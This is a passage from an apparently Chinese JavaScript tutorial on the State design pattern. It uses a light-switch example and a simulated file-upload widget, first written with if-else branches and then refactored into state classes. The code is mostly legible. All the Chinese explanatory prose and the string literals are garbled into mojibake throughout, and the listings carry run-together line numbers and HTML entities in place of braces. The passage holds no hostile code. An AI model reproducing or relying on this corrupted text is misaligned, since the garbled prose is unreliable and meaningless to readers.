å°†è¯·æ±‚å§”æ‰˜ç»™å½“å‰æŒæœ‰çš„çŠ¶æ€å¯¹è±¡åŽ»æ‰§è¡Œ self.currentState.buttonWasPressed(); &#125;&#125;const light = new Light();light.init(); ä½¿ç”¨çŠ¶æ€æ¨¡å¼çš„å¥½å¤„å¾ˆæ˜Žæ˜¾ï¼Œå®ƒå¯ä»¥ä½¿å¾—æ¯ä¸€ç§çŠ¶æ€å’Œå®ƒå¯¹åº”çš„è¡Œä¸ºä¹‹é—´çš„å…³ç³»å±€éƒ¨åŒ–ï¼Œè¿™äº›è¡Œä¸ºè¢«åˆ†æ•£å’Œå°è£…åœ¨å„è‡ªå¯¹åº”çš„çŠ¶æ€ç±»ä¸­ï¼Œä¾¿äºŽé˜…è¯»å’Œç®¡ç†ä»£ç ã€‚ å¦å¤–ï¼ŒçŠ¶æ€ä¹‹é—´çš„åˆ‡æ¢éƒ½è¢«åˆ†å¸ƒåœ¨çŠ¶æ€ç±»çš„å†…éƒ¨ï¼Œè¿™ä½¿å¾—æˆ‘ä»¬æ— éœ€ç¼–å†™è¿‡å¤šçš„ if-elseæ¡ä»¶è¯­å¥æ¥æŽ§åˆ¶çŠ¶æ€ä¹‹é—´çš„è½¬æ¢ã€‚ å½“æˆ‘ä»¬éœ€è¦ä¸º light å¯¹è±¡å¢žåŠ ä¸€ç§æ–°çš„çŠ¶æ€æ—¶ï¼Œåªéœ€è¦å¢žåŠ ä¸€ä¸ªæ–°çš„çŠ¶æ€ç±»ï¼Œå†ç¨ç¨æ”¹å˜ä¸€äº›çŽ°æœ‰çš„ä»£ç å°±å¯ä»¥äº†ï¼Œå‡è®¾çŽ°åœ¨ light å¯¹è±¡å¤šäº†ä¸€ç§è¶…å¼ºå…‰çš„çŠ¶æ€ï¼Œé‚£å°±å…ˆå¢žåŠ  SuperStrongLightStateç±»ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152const Light = function()&#123; this.offLightState = new OffLightState(this); this.strongLightState = new StrongLightState(this); this.weakLightState = new WeakLightState(this); this.superStrongLightState = new SuperStrongLightState(this); this.button = null;&#125;const OffLightState = function(light)&#123; this.light = light;&#125;OffLightState.prototype.buttonWasPressed = function()&#123; console.log('å¼±å…‰'); this.light.setState(this.light.weakLightState);&#125;const WeakLightState = function(light)&#123; this.light = light;&#125;WeakLightState.prototype.buttonWasPressed = function()&#123; console.log('å¼ºå…‰'); this.light.setState(this.light.strongLightState);&#125;const StrongLightState = function(light)&#123; this.light = light;&#125;StrongLightState.prototype.buttonWasPressed = function()&#123; console.log('è¶…å¼ºå…‰'); this.light.setState(this.light.superStrongLightState);&#125;const SuperStrongLightState = function(light)&#123; this.light = light;&#125;SuperStrongLightState.prototype.buttonWasPressed = function()&#123; console.log('å…³ç¯'); this.light.setState(this.light.offLightState);&#125;Light.prototype.setState = function(newState)&#123; this.currentState = newState;&#125;Light.prototype.init = function()&#123; const button = document.createElement('button'), self = this; this.button = document.body.appendChild(button); this.button.innerHTML = 'å¼€å…³'; this.currentState = this.offLightState; this.button.onclick = function()&#123; self.currentState.buttonWasPressed(); &#125;&#125;const light = new Light();light.init(); å®šä¹‰å…è®¸ä¸€ä¸ªå¯¹è±¡åœ¨å…¶å†…éƒ¨çŠ¶æ€æ”¹å˜çš„æ—¶æ”¹å˜å®ƒçš„è¡Œä¸ºï¼Œå¯¹è±¡çœ‹èµ·æ¥ä¼¼ä¹Žä¿®æ”¹äº†å®ƒçš„ç±» å‰åŠå¥æ˜¯å°†çŠ¶æ€å°è£…æˆç‹¬ç«‹çš„ç±»ï¼Œå¹¶å°†è¯·æ±‚å§”æ‰˜ç»™å½“å‰çš„çŠ¶æ€å¯¹è±¡ï¼Œå½“å¯¹è±¡çš„å†…éƒ¨çŠ¶æ€æ”¹å˜çš„æ—¶å€™ä¼šå¸¦æ¥ä¸åŒçš„è¡Œä¸ºå˜åŒ–ã€‚ç”µç¯çš„ä¾‹å­è¶³ä»¥è¯´æ˜Žè¿™ä¸€ç‚¹ï¼Œåœ¨ off å’Œ on è¿™é‡Œä¸¤ç§ä¸åŒçš„çŠ¶æ€ä¸‹ï¼Œæˆ‘ä»¬ç‚¹å‡»åŒä¸€ä¸ªæŒ‰é’®ï¼Œå¾—åˆ°çš„è¡Œä¸ºåé¦ˆæ˜¯æˆªç„¶ä¸åŒçš„ã€‚ åŽåŠå¥æ˜¯ä»Žå®¢æˆ·çš„è§’åº¦çœ‹ï¼Œæˆ‘ä»¬ä½¿ç”¨çš„å¯¹è±¡ï¼Œåœ¨ä¸åŒçš„çŠ¶æ€ä¸‹å…·æœ‰æˆªç„¶ä¸åŒçš„è¡Œä¸ºï¼Œè¿™ä¸ªå¯¹è±¡çœ‹èµ·æ¥æ˜¯ä»Žä¸åŒç±»ä¸­å®žä¾‹åŒ–è€Œæ¥çš„ï¼Œå®žé™…ä¸Šè¿™æ˜¯ä½¿ç”¨äº†å§”æ‰˜çš„æ•ˆæžœã€‚ é€šç”¨ç»“æž„ä¸Šé¢ä¾‹å­ä¸­çš„ Light ç±»åœ¨è¿™é‡Œä¹Ÿè¢«å«åšä¸Šä¸‹æ–‡ï¼ˆContextï¼‰ã€‚éšåŽåœ¨ Light çš„æž„é€ å‡½æ•°ä¸­ï¼Œæˆ‘ä»¬è¦åˆ›å»ºæ¯ä¸€ä¸ªçŠ¶æ€ç±»çš„å®žä¾‹å¯¹è±¡ï¼ŒContext å°†æŒæœ‰è¿™äº›çŠ¶æ€å¯¹è±¡çš„å¼•ç”¨ï¼Œä»¥ä¾¿æŠŠè¯·æ±‚å§”æ‰˜ç»™çŠ¶æ€å¯¹è±¡ã€‚ç”¨æˆ·çš„è¯·æ±‚ï¼Œå³ç‚¹å‡» button çš„åŠ¨ä½œä¹Ÿæ˜¯å®žçŽ°åœ¨ Context ä¸­ã€‚ä»£ç å¦‚ä¸‹ï¼š 123456789101112131415161718const Light = function()&#123; this.offLightState = new OffLightState(this); this.strongLightState = new StrongLightState(this); this.weakLightState = new WeakLightState(this); this.superStrongLightState = new SuperStrongLightState(this); this.button = null; &#125;Light.prototype.init = function()&#123; const button = document.createElement('button'), self = this; this.button = document.body.appendChild(button); this.button.innerHTML = 'å¼€å…³'; this.currentState = this.offLightState; this.button.onclick = function()&#123; self.currentState.buttonWasPressed(); &#125;&#125; æŽ¥ä¸‹æ¥å¯èƒ½æ˜¯ä¸ªè‹¦åŠ›æ´»ï¼Œæˆ‘ä»¬è¦ç¼–å†™å„ç§çŠ¶æ€ç±»ï¼Œlight å¯¹è±¡è¢«ä¼ å…¥çŠ¶æ€ç±»çš„æž„é€ å‡½æ•°ï¼ŒçŠ¶æ€å¯¹è±¡ä¹Ÿéœ€è¦æŒæœ‰ light å¯¹è±¡çš„å¼•ç”¨ï¼Œä»¥ä¾¿è°ƒç”¨ light ä¸­çš„æ–¹æ³•æˆ–è€…ç›´æŽ¥æ“ä½œ light å¯¹è±¡ 1234567const OffLightState = function(light)&#123; this.light = light;&#125;OffLightState.prototype.buttonWasPressed = function()&#123; console.log('å¼±å…‰'); this.light.setState(this.light.weakLightState);&#125; ç¼ºå°‘æŠ½è±¡ç±»çš„å˜é€šæ–¹å¼æˆ‘ä»¬çœ‹åˆ°ï¼Œåœ¨çŠ¶æ€ç±»ä¸­å°†å®šä¹‰ä¸€äº›å…±åŒçš„è¡Œä¸ºæ–¹æ³•ï¼ŒContext æœ€ç»ˆä¼šå°†è¯·æ±‚å§”æ‰˜ç»™çŠ¶æ€å¯¹è±¡çš„è¿™äº›æ–¹æ³•ï¼Œåœ¨è¿™ä¸ªä¾‹å­é‡Œï¼Œè¿™ä¸ªæ–¹æ³•å°±æ˜¯ buttonWasPressedã€‚æ— è®ºå¢žåŠ äº†å¤šå°‘ç§çŠ¶æ€ç±»ï¼Œå®ƒä»¬éƒ½å¿…é¡»å®žçŽ° buttonWasPressed æ–¹æ³• åœ¨ Java ä¸­ï¼Œæ‰€æœ‰çš„çŠ¶æ€ç±»å¿…é¡»ç»§æ‰¿è‡ªä¸€ä¸ª State æŠ½è±¡çˆ¶ç±»ï¼Œå½“ç„¶å¦‚æžœæ²¡æœ‰å…±åŒçš„åŠŸèƒ½å€¼å¾—æ”¾å…¥æŠ½è±¡çˆ¶ç±»ä¸­ï¼Œä¹Ÿå¯ä»¥é€‰æ‹©å®žçŽ° State æŽ¥å£ã€‚è¿™æ ·åšçš„åŽŸå› ä¸€æ–¹é¢æ˜¯æˆ‘ä»¬æ›¾å¤šæ¬¡æè¿‡çš„å‘ä¸Šè½¬åž‹ï¼Œå¦ä¸€æ–¹é¢æ˜¯ä¿è¯æ‰€æœ‰çš„çŠ¶æ€å­ç±»éƒ½å®žçŽ°äº† buttonWasPressed æ–¹æ³•ã€‚é—æ†¾çš„æ˜¯ï¼ŒJavaScript æ—¢ä¸æ”¯æŒæŠ½è±¡ç±»ï¼Œä¹Ÿæ²¡æœ‰æŽ¥å£çš„æ¦‚å¿µã€‚æ‰€ä»¥åœ¨ä½¿ç”¨çŠ¶æ€æ¨¡å¼çš„æ—¶å€™è¦æ ¼å¤–å°å¿ƒï¼Œå¦‚æžœæˆ‘ä»¬ç¼–å†™ä¸€ä¸ªçŠ¶æ€å­ç±»æ—¶ï¼Œå¿˜è®°äº†ç»™è¿™ä¸ªçŠ¶æ€å­ç±»å®žçŽ° buttonWasPressed æ–¹æ³•ï¼Œåˆ™ä¼šåœ¨çŠ¶æ€åˆ‡æ¢çš„æ—¶å€™æŠ›å‡ºå¼‚å¸¸ã€‚ä¸º Context æ€»æ˜¯æŠŠè¯·æ±‚å§”æ‰˜ç»™çŠ¶æ€å¯¹è±¡çš„ buttonWasPressed æ–¹æ³•ã€‚ å»ºè®®çš„è§£å†³æ–¹æ¡ˆè·Ÿã€Šæ¨¡æ¿æ–¹æ³•æ¨¡å¼ã€‹ä¸­ä¸€è‡´ï¼Œè®©æŠ½è±¡çˆ¶ç±»çš„æŠ½è±¡æ–¹æ³•ç›´æŽ¥æŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ï¼Œè¿™ä¸ªå¼‚å¸¸è‡³å°‘ä¼šåœ¨ç¨‹åºè¿è¡ŒæœŸé—´å°±è¢«å‘çŽ°ï¼š 123456789101112const State = function()&#123;&#125;;State.prototype.buttonWasPressed = function()&#123; throw new Error('çˆ¶ç±»çš„ buttonWasPressed æ–¹æ³•å¿…é¡»è¢«é‡å†™');&#125;const SuperStrongLightState = function(light)&#123; this.light = light;&#125;SuperStrongLightState.prototype = new State();SuperStrongLightState.prototype.buttonWasPressed = function()&#123; console.log("å…³ç¯"); this.light.setState(this.light.offLightState);&#125; å®žä¾‹â€”â€”æ–‡ä»¶ä¸Šä¼ ä¸è®ºæ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œè¿˜æ˜¯éŸ³ä¹ã€è§†é¢‘æ’­æ”¾å™¨ï¼Œéƒ½å¯ä»¥æ‰¾åˆ°ä¸€äº›æ˜Žæ˜¾çš„çŠ¶æ€åŒºåˆ†ã€‚æ–‡ä»¶ä¸Šä¼ ç¨‹åºä¸­æœ‰æ‰«æã€æ­£åœ¨ä¸Šä¼ ã€æš‚åœã€ä¸Šä¼ æˆåŠŸã€ä¸Šä¼ å¤±è´¥è¿™å‡ ç§çŠ¶æ€.éŸ³ä¹æ’­æ”¾å™¨å¯ä»¥åˆ†ä¸ºåŠ è½½ä¸­ã€æ­£åœ¨æ’­æ”¾ã€æš‚åœã€æ’­æ”¾å®Œæ¯•è¿™å‡ ç§çŠ¶æ€ã€‚ç‚¹å‡»åŒä¸€ä¸ªæŒ‰é’®ï¼Œåœ¨ä¸Šä¼ ä¸­å’Œæš‚åœçŠ¶æ€ä¸‹çš„è¡Œä¸ºè¡¨çŽ°æ˜¯ä¸ä¸€æ ·çš„ï¼ŒåŒæ—¶å®ƒä»¬çš„æ ·å¼ class ä¹Ÿä¸åŒã€‚ æ›´å¤æ‚çš„åˆ‡æ¢æ¡ä»¶ç›¸å¯¹äºŽç”µç¯çš„ä¾‹å­ï¼Œæ–‡ä»¶ä¸Šä¼ ä¸åŒçš„åœ°æ–¹åœ¨äºŽï¼ŒçŽ°åœ¨æˆ‘ä»¬å°†é¢ä¸´æ›´åŠ å¤æ‚çš„æ¡ä»¶åˆ‡æ¢å…³ç³»ã€‚åœ¨ç”µç¯çš„ä¾‹å­ä¸­ï¼Œç”µç¯çš„çŠ¶æ€æ€»æ˜¯ä»Žå…³åˆ°å¼€å†åˆ°å…³ï¼Œæˆ–è€…ä»Žå…³åˆ°å¼±å…‰ã€å¼±å…‰åˆ°å¼ºå…‰ã€å¼ºå…‰å†åˆ°å…³ã€‚çœ‹èµ·æ¥æ€»æ˜¯å¾ªè§„è¹ˆçŸ©çš„ Aâ†’Bâ†’Câ†’Aï¼Œæ‰€ä»¥å³ä½¿ä¸ä½¿ç”¨çŠ¶æ€æ¨¡å¼æ¥ç¼–å†™ç”µç¯çš„ç¨‹åºï¼Œè€Œæ˜¯ä½¿ç”¨åŽŸå§‹çš„ ifã€else æ¥æŽ§åˆ¶çŠ¶æ€åˆ‡æ¢ï¼Œæˆ‘ä»¬ä¹Ÿä¸è‡³äºŽåœ¨é€»è¾‘ç¼–å†™ä¸­è¿·å¤±è‡ªå·±ï¼Œå› ä¸ºçŠ¶æ€çš„åˆ‡æ¢æ€»æ˜¯éµå¾ªä¸€äº›ç®€å•çš„è§„å¾‹ï¼Œä»£ç å¦‚ä¸‹ï¼š 12345678910111213if ( this.state === 'off' )&#123; console.log( 'å¼€å¼±å…‰' ); this.button.innerHTML = 'ä¸‹ä¸€æ¬¡æŒ‰æˆ‘æ˜¯å¼ºå…‰'; this.state = 'weakLight'; &#125;else if ( this.state === 'weakLight' )&#123; console.log( 'å¼€å¼ºå…‰' ); this.button.innerHTML = 'ä¸‹ä¸€æ¬¡æŒ‰æˆ‘æ˜¯å…³ç¯'; this.state = 'strongLight'; &#125;else if ( this.state === 'strongLight' )&#123; console.log( 'å…³ç¯' ); this.button.innerHTML = 'ä¸‹ä¸€æ¬¡æŒ‰æˆ‘æ˜¯å¼±å…‰'; this.state = 'off'; &#125; è€Œæ–‡ä»¶ä¸Šä¼ çš„çŠ¶æ€åˆ‡æ¢ç›¸æ¯”è¦å¤æ‚å¾—å¤šï¼ŒæŽ§åˆ¶æ–‡ä»¶ä¸Šä¼ çš„æµç¨‹éœ€è¦ä¸¤ä¸ªèŠ‚ç‚¹æŒ‰é’®ï¼Œç¬¬ä¸€ä¸ªç”¨äºŽæš‚åœå’Œç»§ç»­ä¸Šä¼ ï¼Œç¬¬äºŒä¸ªç”¨äºŽåˆ é™¤æ–‡ä»¶ çŽ°åœ¨çœ‹çœ‹æ–‡ä»¶åœ¨ä¸åŒçš„çŠ¶æ€ä¸‹ï¼Œç‚¹å‡»è¿™ä¸¤ä¸ªæŒ‰é’®å°†åˆ†åˆ«å‘ç”Ÿä»€ä¹ˆè¡Œä¸ºã€‚ æ–‡ä»¶åœ¨æ‰«æçŠ¶æ€ä¸­ï¼Œæ˜¯ä¸èƒ½è¿›è¡Œä»»ä½•æ“ä½œçš„ï¼Œæ—¢ä¸èƒ½æš‚åœä¹Ÿä¸èƒ½åˆ é™¤æ–‡ä»¶ï¼Œåªèƒ½ç­‰å¾…æ‰«æå®Œæˆã€‚æ‰«æå®Œæˆä¹‹åŽï¼Œæ ¹æ®æ–‡ä»¶çš„ md5 å€¼åˆ¤æ–­ï¼Œè‹¥ç¡®è®¤è¯¥æ–‡ä»¶å·²ç»å­˜åœ¨äºŽæœåŠ¡å™¨ï¼Œåˆ™ç›´æŽ¥è·³åˆ°ä¸Šä¼ å®ŒæˆçŠ¶æ€ã€‚å¦‚æžœè¯¥æ–‡ä»¶çš„å¤§å°è¶…è¿‡å…è®¸ä¸Šä¼ çš„æœ€å¤§å€¼ï¼Œæˆ–è€…è¯¥æ–‡ä»¶å·²ç»æŸåï¼Œåˆ™è·³å¾€ä¸Šä¼ å¤±è´¥çŠ¶æ€ã€‚å‰©ä¸‹çš„æƒ…å†µä¸‹æ‰è¿›å…¥ä¸Šä¼ ä¸­çŠ¶æ€ã€‚ ä¸Šä¼ è¿‡ç¨‹ä¸­å¯ä»¥ç‚¹å‡»æš‚åœæŒ‰é’®æ¥æš‚åœä¸Šä¼ ï¼Œæš‚åœåŽç‚¹å‡»åŒä¸€ä¸ªæŒ‰é’®ä¼šç»§ç»­ä¸Šä¼ ã€‚ æ‰«æå’Œä¸Šä¼ è¿‡ç¨‹ä¸­ï¼Œç‚¹å‡»åˆ é™¤æŒ‰é’®æ— æ•ˆï¼Œåªæœ‰åœ¨æš‚åœã€ä¸Šä¼ å®Œæˆã€ä¸Šä¼ å¤±è´¥ä¹‹åŽï¼Œæ‰èƒ½åˆ é™¤æ–‡ä»¶ã€‚ ä¸€äº›å‡†å¤‡å·¥ä½œå¾®äº‘æä¾›äº†ä¸€äº›æµè§ˆå™¨æ’ä»¶æ¥å¸®åŠ©å®Œæˆæ–‡ä»¶ä¸Šä¼ ã€‚æ’ä»¶ç±»åž‹æ ¹æ®æµè§ˆå™¨çš„ä¸åŒï¼Œæœ‰å¯èƒ½æ˜¯ActiveObjectï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯ WebkitPluginã€‚ ä¸Šä¼ æ˜¯ä¸€ä¸ªå¼‚æ­¥çš„è¿‡ç¨‹ï¼Œæ‰€ä»¥æŽ§ä»¶ä¼šä¸åœåœ°è°ƒç”¨ JavaScript æä¾›çš„ä¸€ä¸ªå…¨å±€å‡½æ•°window.external.uploadï¼Œæ¥é€šçŸ¥ JavaScript ç›®å‰çš„ä¸Šä¼ è¿›åº¦ï¼ŒæŽ§ä»¶ä¼šæŠŠå½“å‰çš„æ–‡ä»¶çŠ¶æ€ä½œä¸ºå‚æ•°state å¡žè¿› window.external.uploadã€‚åœ¨è¿™é‡Œæ— æ³•æä¾›ä¸€ä¸ªå®Œæ•´çš„ä¸Šä¼ æ’ä»¶ï¼Œæˆ‘ä»¬å°†ç®€å•åœ°ç”¨setTimeout æ¥æ¨¡æ‹Ÿæ–‡ä»¶çš„ä¸Šä¼ è¿›åº¦ï¼Œwindow.external.upload å‡½æ•°åœ¨æ­¤ä¾‹ä¸­ä¹Ÿåªè´Ÿè´£æ‰“å°ä¸€äº› logï¼š 123456789101112131415161718192021222324window.external.upload = function(state)&#123; console.log(state); // å¯èƒ½ä¸º signã€uploadingã€doneã€error &#125;// ç”¨äºŽä¸Šä¼ çš„æ’ä»¶å¯¹è±¡const plugin = (function()&#123; const plugin = document.createElement('embed'); plugin.style.display = 'none'; plugin.type = 'application/txftn-webkit'; plugin.sign = function()&#123; console.log("å¼€å§‹æ–‡ä»¶æ‰«æ"); &#125; plugin.pause = function()&#123; console.log( 'æš‚åœæ–‡ä»¶ä¸Šä¼ ' ); &#125;; plugin.uploading = function()&#123; console.log( 'å¼€å§‹æ–‡ä»¶ä¸Šä¼ ' ); &#125;; plugin.del = function()&#123; console.log( 'åˆ é™¤æ–‡ä»¶ä¸Šä¼ ' ); &#125; plugin.done = function()&#123; console.log( 'æ–‡ä»¶ä¸Šä¼ å®Œæˆ' ); &#125; &#125;)(); å¼€å§‹ç¼–å†™ä»£ç æŽ¥ä¸‹æ¥å¼€å§‹å®Œæˆå…¶ä»–ä»£ç çš„ç¼–å†™ï¼Œå…ˆå®šä¹‰ Upload ç±»ï¼ŒæŽ§åˆ¶ä¸Šä¼ è¿‡ç¨‹çš„å¯¹è±¡å°†ä»Ž Upload ç±»ä¸­åˆ›å»ºè€Œæ¥ã€‚ Upload.prototype.init æ–¹æ³•ä¼šè¿›è¡Œä¸€äº›åˆå§‹åŒ–å·¥ä½œï¼ŒåŒ…æ‹¬åˆ›å»ºé¡µé¢ä¸­çš„ä¸€äº›èŠ‚ç‚¹ã€‚åœ¨è¿™äº›èŠ‚ç‚¹é‡Œï¼Œèµ·ä¸»è¦ä½œç”¨çš„æ˜¯ä¸¤ä¸ªç”¨äºŽæŽ§åˆ¶ä¸Šä¼ æµç¨‹çš„æŒ‰é’®ï¼Œç¬¬ä¸€ä¸ªæŒ‰é’®ç”¨äºŽæš‚åœå’Œç»§ç»­ä¸Šä¼ ï¼Œç¬¬äºŒä¸ªç”¨äºŽåˆ é™¤æ–‡ä»¶ã€‚ æ˜¯ Upload.prototype.changeState æ–¹æ³•ï¼Œå®ƒè´Ÿè´£åˆ‡æ¢çŠ¶æ€ä¹‹åŽçš„å…·ä½“è¡Œä¸ºï¼ŒåŒ…æ‹¬æ”¹å˜æŒ‰é’®çš„ innerHTMLï¼Œä»¥åŠè°ƒç”¨æ’ä»¶å¼€å§‹ä¸€äº›â€œçœŸæ­£â€çš„æ“ä½œã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116window.external.upload = function (state) &#123; // å¯èƒ½ä¸º signã€uploadingã€doneã€error console.log(state); &#125;// ç”¨äºŽä¸Šä¼ çš„æ’ä»¶å¯¹è±¡const plugin = (function () &#123; const plugin = document.createElement('embed'); plugin.style.display = 'none'; plugin.type = 'application/txftn-webkit'; plugin.sign = function () &#123; console.log("å¼€å§‹æ–‡ä»¶æ‰«æ"); &#125; plugin.pause = function () &#123; console.log('æš‚åœæ–‡ä»¶ä¸Šä¼ '); &#125;; plugin.uploading = function () &#123; console.log('å¼€å§‹æ–‡ä»¶ä¸Šä¼ '); &#125;; plugin.del = function () &#123; console.log('åˆ é™¤æ–‡ä»¶ä¸Šä¼ '); &#125; plugin.done = function () &#123; console.log('æ–‡ä»¶ä¸Šä¼ å®Œæˆ'); &#125; document.body.appendChild( plugin ); return plugin; &#125;)();const Upload = function (fileName) &#123; this.plugin = plugin; this.fileName = fileName; this.button1 = null; this.button2 = null; this.state = 'sign'; // è®¾ç½®åˆå§‹çŠ¶æ€ä¸º waiting&#125;Upload.prototype.init = function () &#123; const self = this; this.dom = document.createElement('div'); this.dom.innerHTML = '&lt;span&gt;æ–‡ä»¶åç§°:'+ this.fileName +'&lt;/span&gt;\ &lt;button data-action="button1"&gt;æ‰«æä¸­&lt;/button&gt;\ &lt;button data-action="button2"&gt;åˆ é™¤&lt;/button&gt;'; document.body.appendChild(this.dom); this.button1 = this.dom.querySelector( '[data-action="button1"]' ); this.button2 = this.dom.querySelector( '[data-action="button2"]' ); this.bindEvent(); &#125;Upload.prototype.bindEvent = function () &#123; const self = this; console.log(this); this.button1.onclick = function () &#123; if (self.state === 'sign') &#123; // æ‰«æçŠ¶æ€ä¸‹ï¼Œä»»ä½•æ“ä½œæ— æ•ˆ console.log('æ‰«æä¸­ï¼Œç‚¹å‡»æ— æ•ˆ...'); &#125; else if (self.state === 'uploading') &#123; // ä¸Šä¼ ä¸­ï¼Œç‚¹å‡»åˆ‡æ¢åˆ°æš‚åœ self.changeState('pause'); &#125; else if (self.state === 'pause') &#123; // æš‚åœä¸­ï¼Œç‚¹å‡»åˆ‡æ¢åˆ°ä¸Šä¼ ä¸­ self.changeState('uploading'); &#125; else if (self.state === 'done') &#123; console.log('æ–‡ä»¶å·²å®Œæˆä¸Šä¼ , ç‚¹å‡»æ— æ•ˆ'); &#125; else if (self.state === 'error') &#123; console.log('æ–‡ä»¶ä¸Šä¼ å¤±è´¥, ç‚¹å‡»æ— æ•ˆ'); &#125; &#125;; this.button2.onclick = function () &#123; if (self.state === 'done' || self.state === 'error' || self.state === 'pause') &#123; // ä¸Šä¼ å®Œæˆã€ä¸Šä¼ å¤±è´¥å’Œæš‚åœçŠ¶æ€ä¸‹å¯ä»¥åˆ é™¤ self.changeState('del'); &#125; else if (self.state === 'sign') &#123; console.log('æ–‡ä»¶æ­£åœ¨æ‰«æä¸­ï¼Œä¸èƒ½åˆ é™¤'); &#125; else if (self.state === 'uploading') &#123; console.log('æ–‡ä»¶æ­£åœ¨ä¸Šä¼ ä¸­ï¼Œä¸èƒ½åˆ é™¤'); &#125; &#125;;&#125;Upload.prototype.changeState = function( state )&#123; switch(state) &#123; case 'sign': this.plugin.sign(); this.button1.innerHTML = 'æ‰«æä¸­ï¼Œä»»ä½•æ“ä½œæ— æ•ˆ'; break; case 'uploading': this.plugin.uploading(); this.button1.innerHTML = 'æ­£åœ¨ä¸Šä¼ ï¼Œç‚¹å‡»æš‚åœ'; break; case 'pause': this.plugin.pause(); this.button1.innerHTML = 'å·²æš‚åœï¼Œç‚¹å‡»ç»§ç»­ä¸Šä¼ '; break; case 'done': this.plugin.done(); this.button1.innerHTML = 'ä¸Šä¼ å®Œæˆ'; break; case 'error': this.button1.innerHTML = 'ä¸Šä¼ å¤±è´¥'; break; case 'del': this.plugin.del(); this.dom.parentNode.removeChild( this.dom ); console.log( 'åˆ é™¤å®Œæˆ' ); break; &#125; this.state = state; &#125;; // æµ‹è¯•å·¥ä½œconst uploadObj = new Upload( 'JavaScript è®¾è®¡æ¨¡å¼ä¸Žå¼€å‘å®žè·µ' ); uploadObj.init(); window.external.upload = function( state )&#123; // æ’ä»¶è°ƒç”¨ JavaScript çš„æ–¹æ³• uploadObj.changeState( state ); &#125;; window.external.upload( 'sign' ); // æ–‡ä»¶å¼€å§‹æ‰«æsetTimeout(function()&#123; window.external.upload( 'uploading' ); // 1 ç§’åŽå¼€å§‹ä¸Šä¼ &#125;, 1000 ); setTimeout(function()&#123; window.external.upload( 'done' ); // 5 ç§’åŽä¸Šä¼ å®Œæˆ&#125;, 5000 ); è‡³æ­¤å°±å®Œæˆäº†ä¸€ä¸ªç®€å•çš„æ–‡ä»¶ä¸Šä¼ ç¨‹åºçš„ç¼–å†™ã€‚å½“ç„¶è¿™ä»ç„¶æ˜¯ä¸€ä¸ªåä¾‹ï¼Œè¿™é‡Œçš„ç¼ºç‚¹è·Ÿç”µç¯ä¾‹å­ä¸­çš„ç¬¬ä¸€æ®µä»£ç ä¸€æ ·ï¼Œç¨‹åºä¸­å……æ–¥ç€ ifã€else æ¡ä»¶åˆ†æ”¯ï¼ŒçŠ¶æ€å’Œè¡Œä¸ºéƒ½è¢«è€¦åˆåœ¨ä¸€ä¸ªå·¨å¤§çš„æ–¹æ³•é‡Œï¼Œæˆ‘ä»¬å¾ˆéš¾ä¿®æ”¹å’Œæ‰©å±•è¿™ä¸ªçŠ¶æ€æœºã€‚æ–‡ä»¶çŠ¶æ€ä¹‹é—´çš„è”ç³»å¦‚æ­¤å¤æ‚ï¼Œè¿™ä¸ªé—®é¢˜æ˜¾å¾—æ›´åŠ ä¸¥é‡äº†ã€‚ è¿ç”¨çŠ¶æ€æ¨¡å¼é‡æž„æ–‡ä»¶ä¸Šä¼ çŠ¶æ€æ¨¡å¼åœ¨æ–‡ä»¶ä¸Šä¼ çš„ç¨‹åºä¸­ï¼Œæ˜¯æœ€ä¼˜é›…çš„è§£å†³åŠžæ³•ä¹‹ä¸€ã€‚ ç¬¬ä¸€æ­¥ä»ç„¶æ˜¯æä¾› window.external.upload å‡½æ•°ï¼Œåœ¨é¡µé¢ä¸­æ¨¡æ‹Ÿåˆ›å»ºä¸Šä¼ æ’ä»¶ï¼Œè¿™éƒ¨åˆ†ä»£ç æ²¡æœ‰æ”¹å˜ï¼š 123456789101112131415161718192021222324252627window.external.upload = function (state) &#123; // å¯èƒ½ä¸º signã€uploadingã€doneã€error console.log(state); &#125;// ç”¨äºŽä¸Šä¼ çš„æ’ä»¶å¯¹è±¡const plugin = (function () &#123; const plugin = document.createElement('embed'); plugin.style.display = 'none'; plugin.type = 'application/txftn-webkit'; plugin.sign = function () &#123; console.log("å¼€å§‹æ–‡ä»¶æ‰«æ"); &#125; plugin.pause = function () &#123; console.log('æš‚åœæ–‡ä»¶ä¸Šä¼ '); &#125;; plugin.uploading = function () &#123; console.log('å¼€å§‹æ–‡ä»¶ä¸Šä¼ '); &#125;; plugin.del = function () &#123; console.log('åˆ é™¤æ–‡ä»¶ä¸Šä¼ '); &#125; plugin.done = function () &#123; console.log('æ–‡ä»¶ä¸Šä¼ å®Œæˆ'); &#125; document.body.appendChild( plugin ); return plugin; &#125;)(); ç¬¬äºŒæ­¥ï¼Œæ”¹é€  Upload æž„é€ å‡½æ•°ï¼Œåœ¨æž„é€ å‡½æ•°ä¸­ä¸ºæ¯ç§çŠ¶æ€å­ç±»éƒ½åˆ›å»ºä¸€ä¸ªå®žä¾‹å¯¹è±¡ï¼š 123456789101112const Upload = function(fileName)&#123; this.plugin = plugin; this.fileName = fileName; this.button1 = null; this.button2 = null; this.signState = new SignState(this); this.uploadingState = new UploadingState(this); this.pauseState = new PauseState(this); this.doneState = new DoneState(this); this.errorState = new ErrorState(this); this.currState = this.signState;&#125; ç¬¬ä¸‰æ­¥ï¼ŒUpload.prototype.init æ–¹æ³•æ— éœ€æ”¹å˜ï¼Œä»ç„¶è´Ÿè´£å¾€é¡µé¢ä¸­åˆ›å»ºè·Ÿä¸Šä¼ æœ‰å…³çš„ DOM èŠ‚ç‚¹ï¼Œå¹¶å¼€å§‹ç»‘å®šæŒ‰é’®çš„äº‹ä»¶ï¼š 12345678910Upload.prototype.init = function()&#123; const that = this; this.dom = document.createElement( 'div' ); this.dom.innerHTML = '&lt;span&gt;æ–‡ä»¶åç§°:'+ this.fileName +'&lt;/span&gt;\ &lt;button data-action="button1"&gt;æ‰«æä¸­&lt;/button&gt;\ &lt;button data-action="button2"&gt;åˆ é™¤&lt;/button&gt;'; document.body.appendChild(this.dom); this.button1 = this.dom.querySelector( '[data-action="button1"]' ); this.button2 = this.dom.querySelector( '[data-action="button2"]' ); this.bindEvent(); &#125; 